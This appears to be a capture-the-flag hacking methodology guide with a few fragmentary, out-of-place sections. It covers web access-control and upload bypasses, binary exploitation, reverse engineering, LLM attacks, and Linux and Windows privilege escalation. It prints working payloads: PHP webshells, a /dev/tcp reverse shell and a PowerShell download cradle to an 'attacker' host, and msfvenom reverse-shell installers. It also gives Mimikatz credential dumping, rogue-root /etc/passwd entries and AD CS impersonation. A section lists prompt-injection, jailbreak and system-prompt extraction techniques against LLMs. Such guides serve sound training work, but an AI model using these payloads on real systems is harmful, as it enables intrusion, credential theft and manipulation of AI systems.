Step 5: Authorization bypass (IDOR / BAC / privilege escalation via the app itself)

Distinguish the two failure modes up front: - Authentication bypass — getting in without valid creds at all (not this section). - Authorization bypass (Broken Access Control) — you're logged in, but you can act on/view data or functions you shouldn't be able to. This is one of the highest-yield bug classes in web CTFs because it's rarely automatable and requires manual, methodical testing.

Authz testing workflow
├─ Map every endpoint + role combo first (unauth, low-priv user, admin if creatable)
│   → capture each request in Burp, save to a dedicated project/site map
├─ Horizontal privilege escalation (same role, different user's data)
│   ├─ IDOR: swap object IDs in URL/body/params you don't own
│   │   e.g. /api/orders/1042 → try 1041, 1043, or your own ID off-by-one
│   ├─ Try both numeric AND non-sequential IDs (UUID) — some apps only "protect"
│   │   the ID format, not the actual authorization check
│   └─ Check every HTTP verb per endpoint (GET protected but PUT/DELETE not checked)
├─ Vertical privilege escalation (lower role reaching higher-role functionality)
│   ├─ Direct object/URL access to admin-only pages while authenticated as low-priv
│   │   (/admin/panel, /api/admin/users) even if UI hides the link
│   ├─ Parameter-based role tampering: role=user → role=admin in request body/JWT/cookie
│   ├─ Mass assignment: add unexpected fields to a request body
│   │   (isAdmin=true, role=admin) that the backend blindly binds to the model
│   └─ Forced browsing: guess/fuzz admin paths even with no visible link
│       (ffuf -u http://target/FUZZ -w admin-panels.txt)
├─ Method/path confusion bypass techniques (when a direct request IS blocked)
│   ├─ Case manipulation: /Admin, /ADMIN, /admin/
│   ├─ Trailing characters: /admin/, /admin.., /admin%20, /admin/.
│   ├─ URL encoding tricks: /%61dmin (a = %61), double encoding /%2561dmin
│   ├─ Path confusion via extra segments: /admin/../admin, /./admin
│   ├─ Header-based bypass: X-Original-URL, X-Rewrite-URL, X-Forwarded-For:127.0.0.1
│   ├─ Verb switching: if POST /admin/delete is blocked, try GET, PUT, or
│   │   override with X-HTTP-Method-Override: DELETE
│   └─ Send request via a different Host header or through a whitelisted internal path
├─ Multi-step process bypass (workflow/state manipulation)
│   ├─ Skip steps: jump directly to a later step's endpoint (e.g. checkout confirm
│   │   without completing payment step) if state isn't server-side enforced
│   └─ Replay/reuse: reuse a token/step from one flow (e.g. password reset) in
│       another user's flow if the token isn't properly bound to that user/session
├─ JWT/session-based authz bypass
│   ├─ Decode JWT (jwt.io / jwt_tool) — check for role/permission claims client can't
│   │   trust the server to re-verify server-side
│   ├─ alg:none, weak HMAC secret, kid header injection (see Crypto/JWT row above)
│   └─ Session fixation: does the app accept an attacker-supplied session ID pre-login?
└─ Confirm impact: read/modify/delete another user's or admin's data → that's the flag
    vector; document exactly which request achieved it (useful for the writeup)

Tools for authz testing

Step 6: File upload bypass

The earlier decision tree flags upload features as a branch point — here's the actual testing methodology and payloads.

Upload bypass workflow
├─ First, just try uploading a raw webshell — many CTF uploaders have zero validation
│   PHP: <?php system($_GET['c']); ?>   saved as shell.php
├─ Extension filtering in place?
│   ├─ Blacklist (blocks .php but not variants)?
│   │   → try alternate executable extensions the server still parses:
│   │     .phtml .php3 .php4 .php5 .php7 .pht .phar .inc
│   │   → try case variation: .PHP .PhP (if filesystem/server is case-insensitive)
│   │   → double extension: shell.jpg.php, shell.php.jpg (depends which side strips)
│   │   → null byte (old PHP <5.3.4 or via multipart trickery): shell.php%00.jpg
│   │   → trailing tricks: shell.php., shell.php%20, shell.php::$DATA (IIS/NTFS ADS)
│   └─ Whitelist (only allows .jpg/.png/etc.)?
│       → check if upload dir is still web-accessible AND server executes based on
│         content-type/config rather than strict extension (e.g. .htaccess trick below)
│       → .htaccess upload (if allowed as a file) to redefine handler:
│         AddType application/x-httpd-php .jpg
│       → look for a SECOND vuln to rename the file post-upload (path traversal,
│         arbitrary rename API) back to something executable
├─ Content-Type / MIME check only (client or server-side)?
│   → burp Repeater: change Content-Type header to image/png/image/jpeg while keeping
│     the .php extension and PHP payload body — many checks only inspect this header
├─ Magic byte / file signature check?
│   → prepend valid image magic bytes to your payload (polyglot file):
│     GIF89a;<?php system($_GET['c']); ?>     (valid GIF header + PHP payload)
│   → generate proper polyglots with `exiftool` (embed payload in EXIF comment of a
│     real JPEG, then find an LFI to include it) or `weevely`/`msfvenom`-generated
│     polyglot images for phpMyAdmin/ImageMagick-style challenges
├─ Server-side re-encoding (image resize/re-compress on upload)?
│   → usually kills simple polyglots; look for a parser-specific bug instead
│     (e.g. ImageTragick CVE-2016-3714 for ImageMagick, exploited via crafted
│     MVG/SVG file that triggers command execution during processing)
├─ Path traversal in filename field?
│   → filename="../../var/www/html/shell.php" if filename isn't sanitized, to
│     write outside the intended upload directory
├─ Upload directory not web-executable, but IS readable?
│   → chain with an LFI elsewhere on the site to include your uploaded file
│     (php://filter or direct include of /uploads/shell.jpg parsed as PHP via LFI)
├─ Race condition on upload?
│   → server validates then moves file (TOCTOU window) — rapidly re-request the
│     file at its predictable temp/final path before validation deletes it
│     (Burp Turbo Intruder / ffuf with high concurrency during upload+access)
├─ Zip/archive upload that gets extracted server-side?
│   → zip slip: craft an archive with `../../` in entry filenames to write outside
│     the extraction directory
├─ SVG upload allowed?
│   → SVGs can contain <script> (stored XSS) or XXE payloads if parsed as XML
├─ Size/quantity limits only, no content validation?
│   → confirms it's worth spending time on the bypasses above rather than elsewhere
└─ Once shell lands: confirm exact upload path (check response body / predictable
    naming pattern / directory listing) then request it directly to trigger execution

Tools/commands

# Fuzz for alternate executable extensions accepted by the server

Step 8: Web cache poisoning / deception + XS-Leaks (increasingly common in current CTFs)

├─ Cache poisoning: find an unkeyed input (header/param the cache ignores but the
│   origin server uses) → inject a malicious value → poisoned response gets cached
│   and served to other victims. Test with X-Forwarded-Host, X-Forwarded-Scheme,
│   or any custom header, using Burp's "Param Miner" extension to auto-discover
│   unkeyed inputs.
├─ Cache DECEPTION (the inverse): trick the cache into storing a *victim's*
│   personalized/sensitive response under an attacker-guessable cache key —
│   e.g. request /account/settings/nonexistent.css and see if the cache stores
│   the real account page because it only keys on the static-looking extension.
│   Send the crafted link to a victim, then request the same URL yourself to
│   read their cached response.
├─ Internal cache poisoning: poisoning caches that sit *inside* the
│   application stack (e.g. a framework's internal Next.js/edge cache) rather
│   than a conventional CDN — check framework-specific rendering/cache
│   internals if a standard CDN poisoning attempt fails.
└─ XS-Leaks (cross-site leaks): infer cross-origin information without classic
    XSS/CORS misconfig, purely from observable side channels — response
    timing, response size (e.g. via compression oracle or Content-Length),
    frame counting, or error-event firing on <script>/<img> loads. Useful when
    direct data exfiltration is blocked by SOP/CORS but a boolean or numeric
    leak is enough to win the challenge. Reference: xsleaks.dev for the full
    technique catalog.

Step 9: Prototype pollution (Node.js / client-side JS apps)

├─ Server-side: find a recursive merge/clone/extend of user-controlled JSON
│   (lodash.merge, jQuery.extend, custom deep-merge) → inject
│   {"__proto__": {"polluted": true}} and check if it affects unrelated objects
├─ Confirm impact by finding a "gadget" — existing code that reads a property
│   you can now pollute in a way that changes behavior (e.g. a template engine
│   reading a config flag, or a spawned child_process picking up an env-like
│   property) → escalate pollution to RCE or auth bypass
├─ Client-side: pollute via URL fragment/query parsing libraries, then chain
│   into DOM XSS if a polluted property is later used in an innerHTML sink
└─ Tools: Burp's "Server-Side Prototype Pollution Scanner" extension automates
    black-box detection without needing source access

Note — Web LLM / AI-integration bugs: if the target is an LLM-backed web app (chatbot, RAG search, AI agent endpoint), treat prompt injection as a first-class web bug class in its own right — see the new AI/LLM Security category (Section 7) below for the dedicated methodology.

# continued fraction expansion of e/n to recover d

3. BINARY EXPLOITATION (PWN) — Methodology & Tools

Step 1: Baseline recon

file chall

Step 2: Manual/dynamic analysis

(gdb) run < input.txt

Step 3: Build the exploit with pwntools

from pwn import *
context.binary = elf = ELF('./chall')
# io = process('./chall')          # local
io = remote('target', 1337)        # remote

payload = b'A'*offset + p64(ret_addr)
io.sendline(payload)
io.interactive()

Step 4: Find gadgets

ROPgadget --binary chall --only "pop|ret" | grep rdi
ropper --file chall --search "pop rdi"
one_gadget libc.so.6            # single-gadget shell for ret2libc

Step 5: Leak-based ASLR/PIE defeat

# format string leak
io.sendline(b'%7$p')
leak = int(io.recvline(), 16)
libc_base = leak - libc.symbols['known_func']

Step 6: Libc identification from a leak

# libc-database
git clone https://github.com/niklasb/libc-database
./find printf <leaked_bytes>

Step 7: Heap exploitation

# pwndbg heap commands
(gdb) heap
(gdb) bins
(gdb) vis_heap_chunks

Study "how2heap" (github.com/shellphish/how2heap) for tcache poisoning, fastbin dup, unsorted-bin attack templates — copy the pattern matching the glibc version in use (strings libc.so.6 | grep "GNU C Library").

Modern glibc mitigations you must account for (2.32+, i.e. Ubuntu 20.04+/22.04): - Safe-Linking (glibc ≥2.32): tcache/fastbin fd pointers are XOR-masked with (heap_base >> 12) before being stored, so a raw overwrite of fd with an arbitrary target no longer works directly. You need a heap-address leak first, then compute mask = (leaked_ptr >> 12) ^ target_addr to forge a valid poisoned pointer. Standard pwntools helper pattern: python def safe_link(ptr, pos): return ptr ^ (pos >> 12) fake_fd = safe_link(target_addr, chunk_addr) - __malloc_hook/__free_hook/__realloc_hook were removed entirely in glibc 2.34 — the classic "overwrite __free_hook with system" one-liner no longer exists on any current distro. Modern goals instead: - GOT overwrite (if partial RELRO) — still the simplest option when available. - FSOP (File Stream Oriented Programming) / House of Apple / House of Kiwi — corrupt a FILE structure (e.g. _IO_2_1_stdout_) via vtable/jump-table hijack to get control on exit()/fclose()/next stdio call. This is now the standard glibc ≥2.34 heap-to-RCE path; study _IO_FILE_plus layout and _IO_file_jumps in the target's libc. - __exit_funcs / _IO_wide_data corruption as alternate FSOP variants when the direct vtable is checked (glibc validates _IO_FILE vtables land within valid ranges since 2.24 — _IO_validate_vtable — so exploits now typically pivot into _IO_str_jumps/_IO_wstr_jumps or use IO_FILE_plus_STDOUT "House of Apple" chains to satisfy the check). - Tcache double-free check (glibc ≥2.29): a key field detects trivial same-chunk double frees — bypass by freeing an intermediate different chunk between the two frees of the target, or corrupt the key field directly if you have a separate write primitive. - Practical implication: always confirm the exact glibc version shipped with the challenge (./libc.so.6 or patchelf'd binary) before reusing an "old" writeup's technique — a script written against 2.27 usually won't run unmodified against 2.35+.

Step 8: Kernel pwn

# Typical local kernel CTF setup

  -append "console=ttyS0 kaslr" -s -nographic

Beyond classic module-driver UAF/race bugs, recent kernel-pwn CTFs increasingly feature io_uring-based challenges — io_uring's shared submission/completion queues have been a rich source of race conditions and reference-counting bugs since ~2022. If the target binary/module touches io_uring_setup/io_uring_enter, check for known CVE classes around buffer registration and SQPOLL thread races before falling back to generic UAF hunting.

4. REVERSE ENGINEERING — Methodology & Tools

Step 4: Dynamic analysis

(gdb) break *0x401234
(gdb) run
(gdb) x/20i $pc

Or on Windows targets: x64dbg, set breakpoints on comparison routines.

Step 5: Anti-debug bypass

# patch ptrace(PTRACE_TRACEME) call to always succeed, via Ghidra's patch
# or LD_PRELOAD a stub that no-ops ptrace

Step 6: VM-based obfuscation - Identify the dispatch loop (big switch statement reading opcode bytes). - Write a Python emulator replicating each opcode handler you reverse, OR use miasm/unicorn to emulate the VM bytecode directly.

from unicorn import *
from unicorn.x86_const import *
# set up emulated memory + registers, step through VM bytecode

Step 7: Symbolic execution (angr) — for constraint-heavy binaries

import angr, claripy
proj = angr.Project('./binary', auto_load_libs=False)
flag_chars = [claripy.BVS(f'c{i}', 8) for i in range(32)]
flag = claripy.Concat(*flag_chars)
state = proj.factory.entry_state(stdin=flag)
for c in flag_chars:
    state.solver.add(c >= 0x20, c <= 0x7e)
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))
print(simgr.found[0].solver.eval(flag, cast_to=bytes))

Step 8: Frida for runtime instrumentation (mobile/native)

frida-trace -i "strcmp" ./binary

Tool cheat-sheet: Ghidra, IDA Free, radare2/cutter, x64dbg, angr, unicorn/miasm, Frida, upx.

7. AI / LLM SECURITY — Methodology & Tools

A newer but now-standard CTF category (seen in HTB, TryHackMe, and dedicated events like CrowdStrike's AI Unlocked). Distinct from classic web bugs because the "vulnerable parser" is a language model rather than deterministic code.

AI/LLM challenge
├─ Identify the interaction surface
│   ├─ Direct chat interface → you control the prompt directly
│   ├─ Indirect (RAG/document/tool-output) → your payload sits inside data the
│   │   LLM will later read (a file, webpage, email, API response) — the LLM
│   │   itself is tricked into executing instructions it finds while "reading"
│   └─ Agentic (tool-calling/function-calling) → LLM can invoke real actions
│       (file access, code execution, API calls) — highest-impact category
├─ Direct prompt injection / jailbreak
│   ├─ Authority override: claim to be a system/developer message overriding
│   │   prior instructions
│   ├─ Roleplay/reframing: "continue this story", "pretend you are X" to shift
│   │   the model out of its guarded persona
│   ├─ Obfuscation: character-splitting, leetspeak, or synonym substitution to
│   │   slip past keyword-based input/output filters
│   ├─ Priming/completion attacks: force the model to begin its answer with a
│   │   fixed prefix, exploiting next-token prediction to bypass refusal
│   └─ False-premise correction: assert an incorrect "fact" about the model's
│       own instructions and let its urge to correct you leak real details
├─ Indirect prompt injection
│   └─ Plant instructions inside content the model will ingest as data (a
│       webpage the agent browses, a PDF it summarizes, a support ticket it
│       triages) — the model fails to distinguish "data to summarize" from
│       "commands to obey"
├─ System prompt / instruction extraction
│   └─ Ask the model to repeat, translate, summarize, or "debug" its own
│       instructions; incremental leakage via repeated reframed questions
│       often works even when direct requests are blocked
├─ Tool-calling / agentic exploitation
│   ├─ Tool poisoning / shadowing: if the agent trusts tool descriptions from
│   │   an untrusted source (e.g. an MCP server), a malicious tool description
│   │   can redirect the agent's behavior without touching the user prompt
│   ├─ Excessive agency: check whether the agent will chain an "innocent" tool
│   │   call sequence into an unintended sensitive action (read file → email
│   │   its contents externally, when only "read" was authorized)
│   └─ Confused deputy: get the agent to perform an action on your behalf that
│       you couldn't do directly, by hiding the request inside data it trusts
├─ Output-sink chaining (treat LLM output like any other untrusted input)
│   └─ If the LLM's response is later rendered as HTML/markdown or passed to
│       another system unsanitized, classic web bugs apply downstream — e.g. a
│       model tricked into emitting a crafted <img>/<script> tag becomes a
│       stored-XSS primitive once rendered in the chat UI
└─ Model-level attacks (less common in jeopardy CTFs, more in dedicated AI/ML
    tracks): model inversion, membership inference, adversarial examples
    against classifiers, training-data poisoning

11. LINUX PRIVESC

1.1 Decision Tree

Low-priv Linux shell
├─ whoami / id / groups → note any unusual group membership (docker, lxd, disk, adm)
├─ sudo -l → any NOPASSWD or GTFOBins-listed binary? → instant win, check GTFOBins
├─ SUID/SGID binaries present?
│   └─ find / -perm -4000 2>/dev/null → cross-ref every result against GTFOBins
├─ Cron jobs running as root with writable script/path? → hijack
├─ Writable /etc/passwd or /etc/shadow? → add root user directly
├─ Kernel version outdated? → check known CVEs (careful: can crash the box)
├─ Capabilities set on binaries (getcap)? → e.g. cap_setuid on python
├─ NFS with no_root_squash? → mount and create SUID binary from attacker box
├─ Docker/LXD group membership? → container escape to host root
├─ Interesting env vars / PATH hijack opportunities? → writable dir in $PATH before real binary
├─ Credentials lying around (configs, .bash_history, backup files)?
├─ Root-owned process with writable binary/library (LD_PRELOAD hijack)?
└─ Still stuck → re-run full enum script, diff against checklist below, check for
    custom/internal software running as root (ps aux)

1.2 Enumeration — Manual Checklist

# Identity & privileges
id; whoami; groups
sudo -l                                   # check what you can run as root
cat /etc/passwd | grep -v nologin         # valid shell users

# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID

# Capabilities (often missed vs SUID)
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
find / -writable -path "*cron*" 2>/dev/null

# World-writable files/dirs owned by root or run as root
find / -writable -type f 2>/dev/null | grep -v "^/proc"
find / -perm -o+w -type d 2>/dev/null

# Kernel/OS version
uname -a; cat /etc/os-release; cat /proc/version

# Running processes (look for root processes you can interact with)
ps aux | grep root

# Network services bound locally
ss -tulpn

# Credentials lying around
find / -iname "*.bak" -o -iname "*password*" -o -iname "*.git" 2>/dev/null
grep -ri "password" /etc/*.conf 2>/dev/null
cat ~/.bash_history
find / -name "*.kdbx" -o -name "id_rsa*" 2>/dev/null

# NFS exports
cat /etc/exports 2>/dev/null

# Docker / LXD group check
id | grep -E "docker|lxd"

1.3 Automated Enum Scripts

# LinPEAS — the standard first move (color-coded, flags likely vectors)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer + run offline:
./linpeas.sh -a > linpeas_out.txt

# LinEnum — lighter alternative
./LinEnum.sh -t

# pspy — see cron/root processes live WITHOUT root (huge for cron-based privesc)
./pspy64

1.4 Exploitation by Vector

GTFOBins (sudo/SUID abuse)

# example: sudo -l shows you can run `find` as root
sudo find . -exec /bin/sh \; -quit
# example: SUID on python
find / -perm -4000 2>/dev/null | grep python
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

Always check https://gtfobins.github.io for the exact binary found — it lists the SUID / sudo / capabilities / shell payload for hundreds of binaries.

Cron hijack

# if a root cron runs a world-writable script:
echo 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' >> /path/to/writable_script.sh
# if the cron runs a script via a PATH-relative binary and PATH is writable/hijackable:
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /dev/shm/binary_name
chmod +x /dev/shm/binary_name
export PATH=/dev/shm:$PATH

Writable /etc/passwd

openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$generatedhash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

Kernel exploits (last resort — can crash the target)

uname -a                       # get exact version
searchsploit linux kernel <version>
# well-known: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034)

Capabilities abuse

getcap -r / 2>/dev/null | grep cap_setuid
# e.g. python3 with cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Docker group → host root

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

LXD group → host root

lxc init ubuntu:18.04 test -c security.privileged=true
lxc config device add test host-root disk source=/ path=/mnt/root recursive=true
lxc start test; lxc exec test /bin/sh

LD_PRELOAD (when sudo -l shows env_keep+=LD_PRELOAD)

// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }

gcc -fPIC -shared -nostartfiles -o preload.so preload.c
sudo LD_PRELOAD=/path/preload.so <allowed_binary>

NFS no_root_squash

# on attacker box, as root, if a share is exported with no_root_squash
mount -o rw,vers=3 target:/share /mnt/share
cp /bin/bash /mnt/share/rootbash
chmod +s /mnt/share/rootbash
# on target
/share/rootbash -p

12. WINDOWS PRIVESC

2.1 Decision Tree

Low-priv Windows shell
├─ whoami /priv → check for dangerous enabled privileges
│   (SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege)
│   └─ SeImpersonate/SeAssignPrimaryToken enabled? → Potato-family exploit → instant SYSTEM
├─ whoami /groups → note high-integrity/admin group membership already present?
├─ Service misconfig?
│   ├─ Unquoted service path with a space + writable dir earlier in path? → hijack
│   ├─ Weak service binary/folder permissions (writable by you)? → replace binary
│   └─ Weak service registry permissions? → modify ImagePath
├─ AlwaysInstallElevated registry keys set? → malicious MSI = SYSTEM
├─ Scheduled tasks running as SYSTEM with writable script/binary? → hijack
├─ Stored credentials anywhere (unattend.xml, web.config, registry, PowerShell history)?
├─ Token impersonation opportunity via a running SYSTEM process? → Potato/RoguePotato
├─ DLL hijacking opportunity (writable dir in PATH before Windows dirs, or missing DLL)?
├─ Weak file/folder permissions on root-run binaries?
├─ Domain-joined box? → check for Active Directory Certificate Services (AD CS)
│   misconfigurations (ESC1–ESC16) — a top-tier vector in current AD-flavored
│   CTFs and often faster than any local vector once a domain user context exists
└─ Still stuck → run WinPEAS + PrivescCheck, review every finding manually

2.2 Enumeration — Manual Checklist

# Identity & privileges
whoami /priv
whoami /groups
net user
net localgroup administrators

# System info
systeminfo
wmic qfe list                          # patch level — check missing KBs

# Services
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
sc qc <servicename>                    # check binpath, start type
accesschk.exe -uwcqv "Authenticated Users" *   # service perms (Sysinternals)

# Scheduled tasks
schtasks /query /fo LIST /v

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored creds
findstr /si password *.txt *.xml *.ini *.config
dir /s /b unattend.xml sysprep.inf sysprep.xml
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-History; (Get-PSReadlineOption).HistorySavePath

# File/folder permissions on interesting binaries
icacls "C:\Program Files\VulnApp\app.exe"

2.4 Exploitation by Vector

Token impersonation (SeImpersonatePrivilege) — most common CTF SYSTEM win

# GodPotato (modern, works on newer Windows builds)
GodPotato.exe -cmd "cmd /c whoami"
# PrintSpoofer alternative
PrintSpoofer.exe -i -c cmd

Unquoted service path

wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v '"'
# if path is C:\Program Files\App Folder\service.exe and "App" dir is writable:
copy malicious.exe "C:\Program Files\App.exe"
sc stop <svc> ; sc start <svc>

Weak service binary permissions

icacls "C:\path\to\service.exe"       # check if you have (W) write access
copy malicious.exe "C:\path\to\service.exe"
sc stop <svc>; sc start <svc>

AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

Scheduled task hijack

# if a SYSTEM task runs a writable script
icacls "C:\Scripts\backup.ps1"
echo "IEX(New-Object Net.WebClient).DownloadString('http://attacker/rev.ps1')" >> C:\Scripts\backup.ps1

DLL hijacking

# find missing/writable DLL load paths for a privileged process
# Sysinternals Process Monitor: filter Result = NAME NOT FOUND, Path ends with .dll
# then drop malicious DLL with matching exported function name in that path

Credential harvesting → lateral/vertical move

# Mimikatz (if you already have local admin, escalate to domain/other creds)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

Active Directory Certificate Services (AD CS) abuse — ESC1–ESC16

If the box is domain-joined, AD CS misconfigurations are now one of the highest-yield privesc paths in AD-flavored CTFs (HTB, PG Practice, TryHackMe AD rooms) — often faster than any local vector once you have any domain user context, because a single misconfigured certificate template can jump straight to Domain Admin.

AD CS workflow
├─ Enumerate certificate templates and CA configuration with Certipy
├─ ESC1 — template lets a low-priv user specify an arbitrary Subject Alternative
│   Name (SAN) AND allows client authentication → request a cert impersonating
│   Domain Admin, then authenticate as them
├─ ESC2/ESC3 — template allows the "Any Purpose" or "Certificate Request Agent"
│   EKU → request an enrollment-agent cert, then enroll on behalf of any user
├─ ESC4 — you (or a group you're in) have write access to a template's
│   configuration itself → reconfigure it to be ESC1-vulnerable, then exploit
├─ ESC6/ESC8 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, or the CA web
│   enrollment endpoint (HTTP) is exposed → NTLM relay a machine account
│   authentication into a certificate request (ESC8), then use that cert
├─ ESC9/ESC10 — weak certificate mapping still enabled (legacy environments,
│   pre-Feb 2025 default) → certificate-based authentication doesn't strictly
│   bind to the intended account, enabling impersonation via UPN mismatch
└─ Once ANY valid high-priv certificate is obtained → use it to request a TGT
    (Kerberos ticket) via PKINIT, or pass-the-certificate for Schannel auth

# Certipy — enumerate and exploit in one tool (most common in current writeups)
certipy find -u user@domain -p 'password' -dc-ip 10.10.10.10 -vulnerable
certipy req -u user@domain -p 'password' -ca CA-NAME -template VulnTemplate \
  -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # get TGT/NTLM hash

# Certify (C#/on-host alternative)
Certify.exe find /vulnerable
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Administrator

Note: since February 2025 Microsoft enforces Strong Certificate Mapping by default, closing ESC9/ESC10-style weak-mapping attacks unless a CTF box has explicitly downgraded the setting — check StrongCertificateBindingEnforcement before assuming those vectors are viable.

13. Cross-Cutting Privesc Principles

General rule of thumb when stuck
├─ "What can I run/write that something with higher privilege will touch?"
│   (cron, scheduled task, service restart, log rotation, file watcher)
├─ "What privilege/capability do I already have that's misconfigured?"
│   (sudo rights, SUID bit, Windows privilege token, capability)
├─ "What credentials are lying around from misconfigured storage?"
│   (config files, history files, memory dumps, registry, backups)
└─ "Is there a version-specific known exploit?" (kernel, service, installed software)
    — check CVE databases, but treat kernel exploits as last resort in CTFs
    (can crash the box and lock out other players/graders)

Priority order to try (fastest/safest → slowest/riskiest): 1. sudo -l / whoami priv → GTFOBins / Potato exploits (near-zero risk, instant) 2. SUID/SGID/capabilities lookup 3. Cron/scheduled task hijack 4. Credential file hunting 5. Service/DLL misconfig exploitation 6. Kernel/CVE exploitation (last resort)
